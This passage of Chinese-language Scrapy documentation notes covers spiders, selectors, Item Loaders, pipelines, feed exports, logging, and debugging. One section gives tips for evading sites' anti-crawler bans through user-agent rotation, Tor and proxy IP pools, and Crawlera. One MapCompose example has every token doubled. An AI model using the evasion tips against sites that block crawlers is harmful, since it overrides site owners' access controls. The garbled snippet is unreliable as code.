MySpider(scrapy.Spider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [ &apos;http://www.example.com/1.html&apos;, &apos;http://www.example.com/2.html&apos;, &apos;http://www.example.com/3.html&apos;, ] def parse(self, response): self.log(&apos;A response from %s just arrived!&apos; % response.url) 另一个在单个回调函数中返回多个Request以及Item的例子: import scrapy from myproject.items import MyItem class MySpider(scrapy.Spider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [ &apos;http://www.example.com/1.html&apos;, &apos;http://www.example.com/2.html&apos;, &apos;http://www.example.com/3.html&apos;, ] def parse(self, response): sel = scrapy.Selector(response) for h3 in response.xpath(&apos;//h3&apos;).extract(): yield MyItem(title=h3) for url in response.xpath(&apos;//a/@href&apos;).extract(): yield scrapy.Request(url, callback=self.parse) CrawlSpider样例 接下来给出配合rule使用CrawlSpider的例子: import scrapy from scrapy.contrib.spiders import CrawlSpider, Rule from scrapy.contrib.linkextractors import LinkExtractor class MySpider(CrawlSpider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [&apos;http://www.example.com&apos;] rules = ( # 提取匹配 &apos;category.php&apos; (但不匹配 &apos;subsection.php&apos;) 的链接并跟进链接(没有callback意味着follow默认为True) Rule(LinkExtractor(allow=(&apos;category\.php&apos;, ), deny=(&apos;subsection\.php&apos;, ))), # 提取匹配 &apos;item.php&apos; 的链接并使用spider的parse_item方法进行分析 Rule(LinkExtractor(allow=(&apos;item\.php&apos;, )), callback=&apos;parse_item&apos;), ) def parse_item(self, response): self.log(&apos;Hi, this is an item page! %s&apos; % response.url) item = scrapy.Item() item[&apos;id&apos;] = response.xpath(&apos;//td[@id=&quot;item_id&quot;]/text()&apos;).re(r&apos;ID: (\d+)&apos;) item[&apos;name&apos;] = response.xpath(&apos;//td[@id=&quot;item_name&quot;]/text()&apos;).extract() item[&apos;description&apos;] = response.xpath(&apos;//td[@id=&quot;item_description&quot;]/text()&apos;).extract() return item XMLFeedSpider例子 该spider十分易用。下边是其中一个例子: from scrapy import log from scrapy.contrib.spiders import XMLFeedSpider from myproject.items import TestItem class MySpider(XMLFeedSpider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [&apos;http://www.example.com/feed.xml&apos;] iterator = &apos;iternodes&apos; # This is actually unnecessary, since it&apos;s the default value itertag = &apos;item&apos; def parse_node(self, response, node): log.msg(&apos;Hi, this is a &lt;%s&gt; node!: %s&apos; % (self.itertag, &apos;&apos;.join(node.extract()))) item = TestItem() item[&apos;id&apos;] = node.xpath(&apos;@id&apos;).extract() item[&apos;name&apos;] = node.xpath(&apos;name&apos;).extract() item[&apos;description&apos;] = node.xpath(&apos;description&apos;).extract() return item CSVFeedSpider例子 下面的例子和之前的例子很像，但使用了 CSVFeedSpider: from scrapy import log from scrapy.contrib.spiders import CSVFeedSpider from myproject.items import TestItem class MySpider(CSVFeedSpider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [&apos;http://www.example.com/feed.csv&apos;] delimiter = &apos;;&apos; headers = [&apos;id&apos;, &apos;name&apos;, &apos;description&apos;] def parse_row(self, response, row): log.msg(&apos;Hi, this is a row!: %r&apos; % row) item = TestItem() item[&apos;id&apos;] = row[&apos;id&apos;] item[&apos;name&apos;] = row[&apos;name&apos;] item[&apos;description&apos;] = row[&apos;description&apos;] return item SitemapSpider样例 Selectors: 以文字构造: &gt;&gt;&gt; body = &apos;&lt;html&gt;&lt;body&gt;&lt;span&gt;good&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;&apos; &gt;&gt;&gt; Selector(text=body).xpath(&apos;//span/text()&apos;).extract() [u&apos;good&apos;] 以response构造: &gt;&gt;&gt; response = HtmlResponse(url=&apos;http://example.com&apos;, body=body) &gt;&gt;&gt; Selector(response=response).xpath(&apos;//span/text()&apos;).extract() [u&apos;good&apos;] Item Loaders: 用Item Loaders装载Items 要使用Item Loader, 你必须先将它实例化. 你可以使用类似字典的对象(例如: Item or dict)来进行实例化, 或者不使用对象也可以, 当不用对象进行实例化的时候,Item会自动使用 ItemLoader.default_item_class 属性中指定的Item 类在Item Loader constructor中实例化. 然后,你开始收集数值到Item Loader时,通常使用 Selectors. 你可以在同一个item field 里面添加多个数值;Item Loader将知道如何用合适的处理函数来“添加”这些数值. from scrapy.contrib.loader import ItemLoader from myproject.items import Product def parse(self, response): l = ItemLoader(item=Product(), response=response) l.add_xpath(&apos;name&apos;, &apos;//div[@class=&quot;product_name&quot;]&apos;) l.add_xpath(&apos;name&apos;, &apos;//div[@class=&quot;product_title&quot;]&apos;) l.add_xpath(&apos;price&apos;, &apos;//p[@id=&quot;price&quot;]&apos;) l.add_css(&apos;stock&apos;, &apos;p#stock]&apos;) l.add_value(&apos;last_updated&apos;, &apos;today&apos;) # you can also use literal values return l.load_item() Item Loader在每个(Item)字段中都包含了一个输入处理器和一个输出处理器｡ 输入处理器收到数据时立刻提取数据 (通过 add_xpath(), add_css() 或者 add_value() 方法) 之后输入处理器的结果被收集起来并且保存在ItemLoader内. l = ItemLoader(Product(), some_selector) l.add_xpath(&apos;name&apos;, xpath1) # (1) l.add_xpath(&apos;name&apos;, xpath2) # (2) l.add_css(&apos;name&apos;, css) # (3) l.add_value(&apos;name&apos;, &apos;test&apos;) # (4) return l.load_item() # (5) 从 xpath1 提取出的数据,传递给 输入处理器 的 name 字段.输入处理器的结果被收集和保存在Item Loader中(但尚未分配给该Item)｡ 输入和输出处理器的优先顺序如下： Item Loader特定于字段的属性：field_in和field_out（最优先） 字段元数据（input_processor和output_processor键） Item Loader默认值：ItemLoader.default_input_processor()和 ItemLoader.default_output_processor()（最少优先级） There are several ways to modify Item Loader context values: loader = ItemLoader(product) loader.context[&apos;unit&apos;] = &apos;cm&apos; loader = ItemLoader(product, unit=&apos;cm&apos;) class ProductLoader(ItemLoader): length_out = MapCompose(parse_length, unit=&apos;cm&apos;) ItemLoader对象 返回一个新的Item Loader来填充给定的Item。如果没有给出项目，则使用该类自动实例化一个项目 default_item_class。 Examples: &gt;&gt;&gt; from scrapy.contrib.loader.processor import TakeFirst &gt;&gt;&gt; loader.get_value(u&apos;name: foo&apos;, TakeFirst(), unicode.upper, re=&apos;name: (.+)&apos;) &apos;FOO` Examples: loader.add_value(&apos;name&apos;, u&apos;Color TV&apos;) loader.add_value(&apos;colours&apos;, [u&apos;white&apos;, u&apos;blue&apos;]) loader.add_value(&apos;length&apos;, u&apos;100&apos;) loader.add_value(&apos;name&apos;, u&apos;name: foo&apos;, TakeFirst(), re=&apos;name: (.+)&apos;) loader.add_value(None, {&apos;name&apos;: u&apos;foo&apos;, &apos;sex&apos;: u&apos;male&apos;}) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.get_xpath(&apos;//p[@class=&quot;product-name&quot;]&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.get_xpath(&apos;//p[@id=&quot;price&quot;]&apos;, TakeFirst(), re=&apos;the price is (.*)&apos;) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.add_xpath(&apos;name&apos;, &apos;//p[@class=&quot;product-name&quot;]&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.add_xpath(&apos;price&apos;, &apos;//p[@id=&quot;price&quot;]&apos;, re=&apos;the price is (.*)&apos;) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.get_css(&apos;p.product-name&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.get_css(&apos;p#price&apos;, TakeFirst(), re=&apos;the price is (.*)&apos;) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.add_css(&apos;name&apos;, &apos;p.product-name&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.add_css(&apos;price&apos;, &apos;p#price&apos;, re=&apos;the price is (.*)&apos;) Available built-in processors &gt;&gt;&gt; from scrapy.contrib.loader.processor import Identity &gt;&gt;&gt; proc = Identity() &gt;&gt;&gt; proc([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) [&apos;one&apos;, &apos;two&apos;, &apos;three&apos;] &gt;&gt;&gt; from scrapy.contrib.loader.processor import TakeFirst &gt;&gt;&gt; proc = TakeFirst() &gt;&gt;&gt; proc([&apos;&apos;, &apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) &apos;one&apos; &gt;&gt;&gt; from scrapy.contrib.loader.processor import Join &gt;&gt;&gt; proc = Join() &gt;&gt;&gt; proc([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) u&apos;one two three&apos; &gt;&gt;&gt; proc = Join(&apos;&lt;br&gt;&apos;) &gt;&gt;&gt; proc([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) u&apos;one&lt;br&gt;two&lt;br&gt;three&apos; &gt;&gt;&gt; from scrapy.contrib.loader.processor import Compose &gt;&gt;&gt; proc = Compose(lambda v: v[0], str.upper) &gt;&gt;&gt; proc([&apos;hello&apos;, &apos;world&apos;]) &apos;HELLO&apos; &gt;&gt;&gt; &gt;&gt;&gt; defdef filter_worldfilter_world((xx):): ... ... returnreturn NoneNone ifif xx ==== &apos;world&apos;&apos;world&apos; elseelse xx ...... &gt;&gt;&gt; &gt;&gt;&gt; fromfrom scrapy.contrib.loader.processorscrapy.contrib.loader.processor importimport MapComposeMapCompose &gt;&gt;&gt; &gt;&gt;&gt; procproc == MapComposeMapCompose((filter_worldfilter_world,, unicodeunicode..upperupper)) &gt;&gt;&gt; &gt;&gt;&gt; procproc([([uu&apos;hello&apos;&apos;hello&apos;,, uu&apos;world&apos;&apos;world&apos;,, uu&apos;this&apos;&apos;this&apos;,, uu&apos;is&apos;&apos;is&apos;,, uu&apos;scrapy&apos;&apos;scrapy&apos;])]) [u&apos;HELLO, u&apos;THIS&apos;, u&apos;IS&apos;, u&apos;SCRAPY&apos;][u&apos;HELLO, u&apos;THIS&apos;, u&apos;IS&apos;, u&apos;SCRAPY&apos;] Scrapy终端(Scrapy shell) 该终端是用来测试XPath或CSS表达式，查看他们的工作方式及从爬取的网页中提取的数据。 强烈推荐您安装 IPython 您可以使用 shell 来启动Scrapy终端: scrapy shell &lt;url&gt; 可用的快捷命令(shortcut) shelp() - 打印可用对象及快捷命令的帮助列表 fetch(request_or_url) - 根据给定的请求(request)或URL获取一个新的response，并更新相关的对象 view(response) - 在本机的浏览器打开给定的response。 首先，我们启动终端: scrapy shell &apos;http://scrapy.org&apos; --nolog 有时您想在spider的某个位置中查看被处理的response， 以确认您期望的response到达特定位置。 这可以通过 scrapy.shell.inspect_response 函数来实现。 以下是如何在spider中调用该函数的例子: import scrapy class MySpider(scrapy.Spider): name = &quot;myspider&quot; start_urls = [ &quot;http://example.com&quot;, &quot;http://example.org&quot;, &quot;http://example.net&quot;, ] def parse(self, response): # We want to inspect one specific response. if &quot;.org&quot; in response.url: from scrapy.shell import inspect_response inspect_response(response, self) # Rest of parsing code. 当运行spider时，您将得到类似下列的输出: 2014-01-23 17:48:31-0400 [myspider] DEBUG: Crawled (200) &lt;GET http://example.com&gt; (referer: None) 2014-01-23 17:48:31-0400 [myspider] DEBUG: Crawled (200) &lt;GET http://example.org&gt; (referer: None) [s] Available Scrapy objects: [s] crawler &lt;scrapy.crawler.Crawler object at 0x1e16b50&gt; ... &gt;&gt;&gt; response.url &apos;http://example.org&apos; 您可以在浏览器里查看response的结果，判断是否是您期望的结果: &gt;&gt;&gt; view(response) True 最后您可以点击Ctrl-D(Windows下Ctrl-Z)来退出终端，恢复爬取: 由于该终端屏蔽了Scrapy引擎，您在这个终端中不能使用 fetch 快捷命令(shortcut) Item Pipeline 当Item在Spider中被收集之后，它将会被传递到Item Pipeline，一些组件会按照一定的顺序执行对Item的处理。 以下是item pipeline的一些典型应用： 清理HTML数据 验证爬取的数据(检查item包含某些字段) 查重(并丢弃) 将爬取结果保存到数据库中 验证价格，同时丢弃没有价格的item from scrapy.exceptions import DropItem class PricePipeline(object): vat_factor = 1.15 def process_item(self, item, spider): if item[&apos;price&apos;]: if item[&apos;price_excludes_vat&apos;]: item[&apos;price&apos;] = item[&apos;price&apos;] * self.vat_factor return item else: raise DropItem(&quot;Missing price in %s&quot; % item) 将item写入JSON文件 以下pipeline将所有(从所有spider中)爬取到的item，存储到一个独立地 items.jl 文件，每行包含一个序列化为JSON格式的item: import json class JsonWriterPipeline(object): def __init__(self): self.file = open(&apos;items.jl&apos;, &apos;wb&apos;) def process_item(self, item, spider): line = json.dumps(dict(item)) + &quot;\n&quot; self.file.write(line) return item JsonWriterPipeline的目的只是为了介绍怎样编写item pipeline，如果你想要将所有爬取的item都保存到同一个JSON文件， 你需要使用 Feed exports 。 去重 from scrapy.exceptions import DropItem class DuplicatesPipeline(object): def __init__(self): self.ids_seen = set() def process_item(self, item, spider): if item[&apos;id&apos;] in self.ids_seen: raise DropItem(&quot;Duplicate item found: %s&quot; % item) else: self.ids_seen.add(item[&apos;id&apos;]) return item 启用一个Item Pipeline组件 为了启用一个Item Pipeline组件，你必须将它的类添加到 ITEM_PIPELINES 配置 ITEM_PIPELINES = { &apos;myproject.pipelines.PricePipeline&apos;: 300, &apos;myproject.pipelines.JsonWriterPipeline&apos;: 800, } 分配给每个类的整型值，确定了他们运行的顺序，item按数字从低到高的顺序，通过pipeline，通常将这些数字定义在0-1000范围内。 Feed exports 实现爬虫时最经常提到的需求就是能合适的保存爬取到的数据，或者说，生成一个带有爬取数据的”输出文件”(通常叫做”输出feed”)，来供其他系统使用。 Scrapy自带了Feed输出，并且支持多种序列化格式(serialization format)及存储方式(storage backends)。 feed输出使用到了 Item exporters 。其自带支持的类型有: JSON JSON lines CSV XML 您也可以通过 FEED_EXPORTERS 设置扩展支持的属性。 存储(Storages) 使用feed输出时您可以通过使用 URI (通过 FEED_URI 设置) 来定义存储端。 feed输出支持URI方式支持的多种存储后端类型。 自带支持的存储后端有: 本地文件系统 FTP S3 (需要 boto) 标准输出 存储URI参数 存储URI也包含参数。当feed被创建时这些参数可以被覆盖: %(time)s - 当feed被创建时被timestamp覆盖 %(name)s - 被spider的名字覆盖 reg： 存储在FTP，每个spider一个目录: ftp://user:password@ftp.example.com/scraping/feeds/%(name)s/%(time)s.json 存储在S3，每一个spider一个目录: s3://mybucket/scraping/feeds/%(name)s/%(time)s.json 存储端(Storage backends) 将feed存储在本地系统。 URI scheme: file URI样例: file:///tmp/export.csv 需要的外部依赖库: none 设定(Settings) 这些是配置feed输出的设定: FEED_URI (必须) FEED_FORMAT FEED_STORAGES FEED_EXPORTERS FEED_STORE_EMPTY Link Extractors Link Extractors 是那些目的仅仅是从网页(scrapy.http.Response 对象)中抽取最终将会被follow链接的对象｡ 每个LinkExtractor有唯一的公共方法是 extract_links ,它接收一个 Response 对象,并返回一个 scrapy.link.Link 对象｡Link Extractors,要实例化一次并且 extract_links 方法会根据不同的response调用多次提取链接｡ LxmlLinkExtractor 是推荐的链接提取器，具有方便的过滤选项。它是使用lxml强大的HTMLParser实现的。 SgmlLinkExtractor 其提供了过滤器（filter），以便于提取包括符合正则表达式的链接。 BaseSgmlLinkExtractor 这个Link Extractor的目的只是充当了Sgml Link Extractor的基类。 Logging Scrapy提供了log功能。您可以通过 scrapy.log 模块使用。 log服务必须通过显示调用 scrapy.log.start() 来开启。 Scrapy提供5层logging级别: CRITICAL - 严重错误(critical) ERROR - 一般错误(regular errors) WARNING - 警告信息(warning messages) INFO - 一般信息(informational messages) DEBUG - 调试信息(debugging messages) 如何设置log级别 您可以通过终端选项(command line option) –loglevel/-L 或 LOG_LEVEL 来设置log级别。 如何记录信息(log messages) 下面给出如何使用 WARNING 级别来记录信息的例子: from scrapy import log log.msg(&quot;This is a warning&quot;, level=log.WARNING) scrapy.log.start(logfile=None, loglevel=None, logstdout=None) 启动log功能。 scrapy.log.msg(message, level=INFO, spider=None) 记录信息(Log a message) 。。。 Logging设置 以下设置可以被用来配置logging: LOG_ENABLED LOG_ENCODING LOG_FILE LOG_LEVEL LOG_STDOUT 数据收集(Stats Collection) Scrapy提供了方便的收集数据的机制。数据以key/value方式存储，值大多是计数值。 该机制叫做数据收集器(Stats Collector)，可以通过 Crawler API 的属性 stats 来使用。 无论数据收集(stats collection)开启或者关闭，数据收集器永远都是可用的。 class ExtensionThatAccessStats(object): def __init__(self, stats): self.stats = stats @classmethod def from_crawler(cls, crawler): return cls(crawler.stats) 设置数据: stats.set_value(&apos;hostname&apos;, socket.gethostname()) 增加数据值: stats.inc_value(&apos;pages_crawled&apos;) 当新的值比原来的值大时设置数据: stats.max_value(&apos;max_items_scraped&apos;, value) 当新的值比原来的值小时设置数据: stats.min_value(&apos;min_free_memory_percent&apos;, value) 获取数据: &gt;&gt;&gt; stats.get_value(&apos;pages_crawled&apos;) 8 获取所有数据: &gt;&gt;&gt; stats.get_stats() {&apos;pages_crawled&apos;: 1238, &apos;start_time&apos;: datetime.datetime(2009, 7, 14, 21, 47, 28, 977139)} 可用的数据收集器 除了基本的 StatsCollector ，Scrapy也提供了基于 StatsCollector 的数据收集器。 您可以通过 STATS_CLASS 设置来选择。默认使用的是 MemoryStatsCollector 。 发送email smtplib 库 有两种方法可以创建邮件发送器(mail sender)。 您可以通过标准构造器(constructor)创建: from scrapy.mail import MailSender mailer = MailSender() 或者您可以传递一个Scrapy设置对象，其会参考 settings: mailer = MailSender.from_settings(settings) 这是如何来发送邮件了(不包括附件): mailer.send(to=[&quot;someone@example.com&quot;], subject=&quot;Some subject&quot;, body=&quot;Some body&quot;, cc=[&quot;another@example.com&quot;]) 在Scrapy中发送email推荐使用MailSender。 Mail设置 这些设置定义了 MailSender 构造器的默认值。其使得在您不编写任何一行代码的情况下，为您的项目配置实现email通知的功能。 MAIL_FROM 默认值: &apos;scrapy@localhost&apos; 用于发送email的地址(address)(填入 From:) 。 MAIL_HOST 默认值: &apos;localhost&apos; 发送email的SMTP主机(host)。 MAIL_PORT 默认值: 25 发用邮件的SMTP端口。 MAIL_USER 默认值: None SMTP用户。如果未给定，则将不会进行SMTP认证(authentication)。 MAIL_PASS 默认值: None 用于SMTP认证，与 MAIL_USER 配套的密码。 MAIL_TLS 默认值: False 强制使用STARTTLS。STARTTLS能使得在已经存在的不安全连接上，通过使用SSL/TLS来实现安全连接。 MAIL_SSL 默认值: False 强制使用SSL加密连接。 Telnet终端(Telnet Console) Scrapy提供了内置的telnet终端，以供检查，控制Scrapy运行的进程。 telnet终端监听设置中定义的 TELNETCONSOLE_PORT ，默认为 6023 。 访问telnet请输入: telnet localhost 6023 &gt;&gt;&gt; crawler Scrapy Crawler (scrapy.crawler.Crawler 对象) engine Crawler.engine属性 spider 当前激活的爬虫(spider) slot the engine slot extensions 扩展管理器(manager) (Crawler.extensions属性) stats 状态收集器 (Crawler.stats属性) settings Scrapy设置(setting)对象 (Crawler.settings属性) est 打印引擎状态的报告 prefs 针对内存调试 (参考 调试内存溢出) p pprint.pprint 函数的简写 hpy 针对内存调试 (参考 调试内存溢出) Web Service Scrapy提供用于监控及控制运行中的爬虫的web服务(service)。 Simple JSON resources - 只读，输出JSON数据 JSON-RPC resources - 通过使用 JSON-RPC 2.0 协议支持对一些Scrapy对象的直接访问 Crawler JSON-RPC资源 默认访问地址: http://localhost:6080/crawler 状态收集器(Stats Collector)JSON-RPC资源 默认访问地址: http://localhost:6080/stats 爬虫管理器(Spider Manager)JSON-RPC资源 http://localhost:6080/crawler/spiders 扩展管理器(Extension Manager)JSON-RPC资源 可用JSON资源 引擎状态JSON资源 常见问题(FAQ) BeautifulSoup 及 lxml 是HTML和XML的分析库。Scrapy则是 编写爬虫，爬取网页并获取数据的应用框架(application framework)。 Scrapy是以广度优先还是深度优先进行爬取的呢？ 默认情况下，Scrapy使用 LIFO 队列来存储等待的请求。简单的说，就是 深度优先顺序 。深度优先对大多数情况下是更方便的。如果您想以 广度优先顺序 进行爬取，你可以设置以下的设定: DEPTH_PRIORITY = 1 SCHEDULER_DISK_QUEUE = &apos;scrapy.squeue.PickleFifoDiskQueue&apos; SCHEDULER_MEMORY_QUEUE = &apos;scrapy.squeue.FifoMemoryQueue&apos; 为什么Scrapy下载了英文的页面，而不是我的本国语言？ 尝试通过覆盖 DEFAULT_REQUEST_HEADERS 设置来修改默认的 Accept-Language 请求头。 调试(Debugging)Spiders import scrapy from myproject.items import MyItem class MySpider(scrapy.Spider): name = &apos;myspider&apos; start_urls = ( &apos;http://example.com/page1&apos;, &apos;http://example.com/page2&apos;, ) def parse(self, response): # collect `item_urls` for item_url in item_urls: yield scrapy.Request(item_url, self.parse_item) def parse_item(self, response): item = MyItem() # populate `item` fields # and extract item_details_url yield scrapy.Request(item_details_url, self.parse_details, meta={&apos;item&apos;: item}) def parse_details(self, response): item = response.meta[&apos;item&apos;] # populate more `item` fields return item 简单地说，该spider分析了两个包含item的页面(start_urls)。Item有详情页面， 所以我们使用 Request 的 meta 功能来传递已经部分获取的item。 检查spier输出的最基本方法是使用 parse 命令。 查看特定url爬取到的item: $ scrapy parse --spider=myspider -c parse_item -d 2 &lt;item_url&gt; [ ... scrapy log lines crawling example.com spider ... ] &gt;&gt;&gt; STATUS DEPTH LEVEL 2 &lt;&lt;&lt; # Scraped Items ------------------------------------------------------------ [{&apos;url&apos;: &lt;item_url&gt;}] # Requests ----------------------------------------------------------------- [] 使用 --verbose 或 -v 选项，查看各个层次的状态: $ scrapy parse --spider=myspider -c parse_item -d 2 -v &lt;item_url&gt; 检查从单个start_url爬取到的item也是很简单的: $ scrapy parse --spider=myspider -d 3 &apos;http://example.com/page1&apos; Scrapy终端(Shell) 检查回调函数内部的过程 from scrapy.shell import inspect_response def parse_details(self, response): item = response.meta.get(&apos;item&apos;, None) if item: # populate more `item` fields return item else: inspect_response(response, self) 有时候您想查看某个response在浏览器中显示的效果，这是可以使用 open_in_browser 功能。 from scrapy.utils.response import open_in_browser def parse_details(self, response): if &quot;item name&quot; not in response.body: open_in_browser(response) Logging 记录(logging)是另一个获取到spider运行信息的方法。 from scrapy import log def parse_details(self, response): item = response.meta.get(&apos;item&apos;, None) if item: # populate more `item` fields return item else: self.log(&apos;No item received for %s&apos; % response.url, level=log.WARNING) Spiders Contracts Scrapy通过合同(contract)的方式来提供了测试spider的集成方法。 每个contract包含在文档字符串(docstring)里，以 @ 开头。 查看下面的例子: def parse(self, response): &quot;&quot;&quot; This function parses a sample response. Some contracts are mingled with this docstring. @url http://www.amazon.com/s?field-keywords=selfish+gene @returns items 1 16 @returns requests 0 0 @scrapes Title Author Year Price &quot;&quot;&quot; 该constract(@url)设置了用于检查spider的其他constract状态的样例url。 该contract是必须的，所有缺失该contract的回调函数在测试时将会被忽略: @url url 该contract(@returns)设置spider返回的items和requests的上界和下界。 上界是可选的: @returns item(s)|request(s) [min [max]] 该contract(@scrapes)检查回调函数返回的所有item是否有特定的fields: @scrapes field_1 field_2 ... 自定义Contracts 如果您想要比内置scrapy contract更为强大的功能，可以在您的项目里创建并设置您自己的 contract，并使用 SPIDER_CONTRACTS 设置来加载: SPIDER_CONTRACTS = { &apos;myproject.contracts.ResponseCheck&apos;: 10, &apos;myproject.contracts.ItemValidate&apos;: 10, } 每个contract必须继承 scrapy.contracts.Contract 并覆盖下列三个方法: adjust_request_args(args) pre_process(response) post_process(output) 实践经验(Common Practices) 除了常用的 scrapy crawl 来启动Scrapy，您也可以使用 API 在脚本中启动Scrapy。 需要注意的是，Scrapy是在Twisted异步网络库上构建的， 因此其必须在Twisted reactor里运行。 同一进程运行多个spider 默认情况下，当您执行 scrapy crawl 时，Scrapy每个进程运行一个spider。 当然，Scrapy通过 内部(internal)API 也支持单进程多个spider from twisted.internet import reactor from scrapy.crawler import Crawler from scrapy import log from testspiders.spiders.followall import FollowAllSpider from scrapy.utils.project import get_project_settings def setup_crawler(domain): spider = FollowAllSpider(domain=domain) settings = get_project_settings() crawler = Crawler(settings) crawler.configure() crawler.crawl(spider) crawler.start() for domain in [&apos;scrapinghub.com&apos;, &apos;insophia.com&apos;]: setup_crawler(domain) log.start() reactor.run() 分布式爬虫(Distributed crawls) 如果您有很多spider，那分布负载最简单的办法就是启动多个Scrapyd，并分配到不同机器上。 如果想要在多个机器上运行一个单独的spider，那您可以将要爬取的url进行分块，并发送给spider。 首先，准备要爬取的url列表，并分配到不同的文件url里: http://somedomain.com/urls-to-crawl/spider1/part1.list http://somedomain.com/urls-to-crawl/spider1/part2.list http://somedomain.com/urls-to-crawl/spider1/part3.list 接着在3个不同的Scrapd服务器中启动spider。spider会接收一个(spider)参数 part ， 该参数表示要爬取的分块: curl http://scrapy1.mycompany.com:6800/schedule.json -d project=myproject -d spider=spider1 -d part=1 curl http://scrapy2.mycompany.com:6800/schedule.json -d project=myproject -d spider=spider1 -d part=2 curl http://scrapy3.mycompany.com:6800/schedule.json -d project=myproject -d spider=spider1 -d part=3 避免被禁止(ban) 有些网站实现了特定的机制，以一定规则来避免被爬虫爬取。 下面是些处理这些站点的建议(tips): 使用user agent池，轮流选择之一来作为user agent。池中包含常见的浏览器的user agent(google一下一大堆) 禁止cookies(参考 COOKIES_ENABLED)，有些站点会使用cookies来发现爬虫的轨迹。 设置下载延迟(2或更高)。参考 DOWNLOAD_DELAY 设置。 如果可行，使用 Google cache 来爬取数据，而不是直接访问站点。 使用IP池。例如免费的 Tor项目 或付费服务(ProxyMesh)。 使用高度分布式的下载器(downloader)来绕过禁止(ban)，您就只需要专注分析处理页面。这样的例子有: Crawlera 如果您仍然无法避免被ban，考虑联系 商业支持. 动态创建Item类 对于有些应用，item的结构由用户输入或者其他变化的情况所控制。您可以动态创建class。 from scrapy.item import DictItem, Field def create_item_class(class_name, field_list): fields = {field_name: Field() for field_name in field_list} return type(class_name, (DictItem,), {&apos;fields&apos;: fields}) 通用爬虫(Broad Crawls) 其能爬取大量(甚至是无限)的网站， 仅仅受限于时间或其他的限制。一般用于搜索引擎。 Scrapy默认的全局并发限制对同时爬取大量网站的情况并不适用，因此您需要增加这个值。 增加多少取决于您的爬虫能占用多少CPU。 一般开始可以设置为 100 。不过最好的方式是做一些测试，获得Scrapy进程占取CPU与并发数的关系。 为了优化性能，您应该选择一个能使CPU占用率在80%-90%的并发数。 降低log级别 在生产环境中进行通用爬取时您不应该使用 DEBUG log级别。 不过在开发的时候使用 DEBUG 应该还能接受。 设置Log级别: LOG_LEVEL = &apos;INFO&apos; 禁止cookies能减少CPU使用率及Scrapy爬虫在内存中记录的踪迹，提高性能。 禁止cookies: COOKIES_ENABLED = False 禁止重试: 对失败的HTTP请求进行重试会减慢爬取的效率，尤其是当站点响应很慢(甚至失败)时， 访问这样的站点会造成超时并重试多次。这是不必要的，同时也占用了爬虫爬取其他站点的能力。 RETRY_ENABLED = False 减小下载超时 如果您对一个非常慢的连接进行爬取(一般对通用爬虫来说并不重要)， 减小下载超时能让卡住的连接能被快速的放弃并解放处理其他站点的能力。 减小下载超时: DOWNLOAD_TIMEOUT = 15 关闭重定向: REDIRECT_ENABLED = False 启用 “Ajax Crawlable Pages” 爬取 有些站点(基于2013年的经验数据，之多有1%)声明其为 ajax crawlable 。 这意味着该网站提供了原本只有ajax获取到的数据的纯HTML版本。 网站通过两种方法声明: 在url中使用 #! - 这是默认的方式; 使用特殊的meta标签 - 这在”main”, “index” 页面中使用。 Scrapy自动解决(1)；解决(2)您需要启用 AjaxCrawlMiddleware: AJAXCRAWL_ENABLED = True 通用爬取经常抓取大量的 “index” 页面； AjaxCrawlMiddleware能帮助您正确地爬取。 由于有些性能问题，且对于特定爬虫没有什么意义，该中间默认关闭。 借助Firefox来爬取 对爬取有帮助的实用Firefox插件 Firebug XPather XPath Checker Tamper Data Firecookie 使用Firebug进行爬取 创建第一个爬取规则: Rule(LinkExtractor(allow=&apos;directory.google.com/[A-Z][a-zA-Z_/]+$&apos;, ), &apos;parse_category&apos;, follow=True, ), Rule 对象指导基于 CrawlSpider 的spider如何跟进目录链接。 parse_category 是spider的方法，用于从页面中处理也提取数据。 from scrapy.contrib.linkextractors import LinkExtractor from scrapy.contrib.spiders import CrawlSpider, Rule class GoogleDirectorySpider(CrawlSpider): name = &apos;directory.google.com&apos; allowed_domains = [&apos;directory.google.com&apos;] start_urls = [&apos;http://directory.google.com/&apos;] rules = ( Rule(LinkExtractor(allow=&apos;directory\.google\.com/[A-Z][a-zA-Z_/]+$&apos;), &apos;parse_category&apos;, follow=True, ), ) def parse_category(self, response): # write the category page data extraction code here pass 调试内存溢出 为了帮助调试内存泄露，Scrapy提供了跟踪对象引用的机制，叫做 trackref ， 或者您也可以使用第三方提供的更先进内存调试库 Guppy (更多内容请查看下面)。而这都必须在 Telnet终端 中使用。 内存泄露的常见原因 （常见原因）内存泄露经常是由于Scrapy开发者在Requests中(有意或无意)传递对象的引用(例如，使用 meta 属性或request回调函数)，使得该对象的生命周期与 Request的生命周期所绑定。 使用 trackref 调试内存泄露 trackref 是Scrapy提供用于调试大部分内存泄露情况的模块。 &gt;&gt;&gt; prefs() oldest值越高越是其内存泄漏问题的出处 很多spider? 如果您的项目有很多的spider，prefs() 的输出会变得很难阅读。针对于此， 该方法具有 ignore 参数，用于忽略特定的类(及其子类)。 使用Guppy调试内存泄露 如果使用 setuptools , 您可以通过下列命令安装Guppy: easy_install guppy telnet终端也提供了快捷方式(hpy)来访问Guppy堆对象(heap objects)。 &gt;&gt;&gt; x = hpy.heap() &gt;&gt;&gt; x.bytype 如果您想要查看哪些属性引用了这些字典 &gt;&gt;&gt; x.bytype[0].byvia Leaks without leaks 